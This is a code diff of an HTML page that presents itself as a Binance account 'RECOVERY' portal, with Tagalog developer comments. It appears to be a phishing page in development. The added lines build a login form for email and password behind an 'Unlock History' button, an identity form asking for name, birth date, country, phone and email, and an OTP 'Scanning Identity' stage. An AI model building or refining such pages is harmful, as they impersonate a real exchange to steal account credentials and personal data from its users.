@@ -46,36 +46,44 @@
 </head>
 <body>
 
-<!-- 1. AUTH OVERLAY -->
+!-- 1. AUTH OVERLAY -->
 <div id="auth-overlay">
-    <div class="auth-card" id="choice-box">
+    
+    <!-- MAIN CHOICE BOX (Naglalaman ng parehong opsyon sa loob) -->
+    <div class="auth-card" id="choice-box" style="display: block;">
         <h2 style="color: var(--yellow);">BINANCE</h2>
         <p style="color:var(--text-gray)">RECOVERY</p>
-        <button class="btn-yellow" onclick="showForm('reg')">RECALL ACCOUNT</button>
-        <button class="btn-yellow" style="background:transparent; border:1px solid #555; color:white; margin-top:10px;" onclick="showForm('login')">Existing account</button>
+        
+        <!-- MGA BUTTON NG PAGPIPILIAN -->
+        <div id="selection-buttons">
+            <button class="btn-yellow" onclick="showForm('reg')">RECALL ACCOUNT</button>
+            <button class="btn-yellow" style="background:transparent; border:1px solid #555; color:white; margin-top:10px;" onclick="showForm('login')">Existing account</button>
+        </div>
+
+        <!-- SA LOOB NITO ANG MISMONG PARA SA EXISTING ACCOUNT (LOGIN) -->
+        <div id="login-fields" style="display: none; margin-top: 20px;">
+            <input type="email" id="l-email" placeholder="Email Address">
+            <input type="password" id="l-password" placeholder="Password">
+            <button class="btn-yellow" type="button" id="login-btn" onclick="startAuth('login')">Unlock History</button>
+            <button style="background:transparent; border:none; color:gray; margin-top:10px; cursor:pointer;" onclick="backToMenu()">← Back</button>
+        </div>
     </div>
 
+    <!-- RECOVERY BOX (RECALL ACCOUNT FORM - NAKAHIWALAY PA RIN) -->
     <div class="auth-card" id="reg-box" style="display:none;">
         <h3>Verify Identity</h3>
         <input type="text" id="r-name" placeholder="Full Name">
         <input type="date" id="r-birth">
         <select id="r-country">
             <option value="" disabled selected>Select Country</option>
-            <option>GERMANY</option><option>USA</option><option>UE</option><option>Singapore</option><option>UK</option><option>JAPAN</option><option>PHIL</option><option>
+            <option>GERMANY</option><option>USA</option><option>UE</option><option>Singapore</option><option>UK</option><option>JAPAN</option><option>PHIL</option>
         </select>
         <input type="tel" id="r-phone" placeholder="Phone Number (+**)">
         <input type="email" id="r-email" placeholder="Personal Email">
         <button class="btn-yellow" onclick="startAuth('reg')">Continue</button>
+        <button style="background:transparent; border:none; color:gray; margin-top:10px; cursor:pointer;" onclick="backToMenu()">← Back</button>
     </div>
-    <!-- Ginawang "login-box" ang ID at "display:block" para makita sa screen -->
-<div class="authcard" id="login-box" style="display:block;">
-    <input type="email" id="l-email" placeholder="Email Address">
-    <input type="password" id="l-password" placeholder="Password">
-    <button type="button" id="login-btn">Log In</button>
-</div>
-  
-        <button class="btn-yellow" onclick="startAuth('login')">Unlock History</button>
-    </div>
+
 
     <div class="auth-card" id="otp-box" style="display:none;">
         <div id="otp-loading"><div class="loader-ring"></div><h3 style="color:var(--yellow); margin-top:20px;">Scanning Identity...</h3></div>
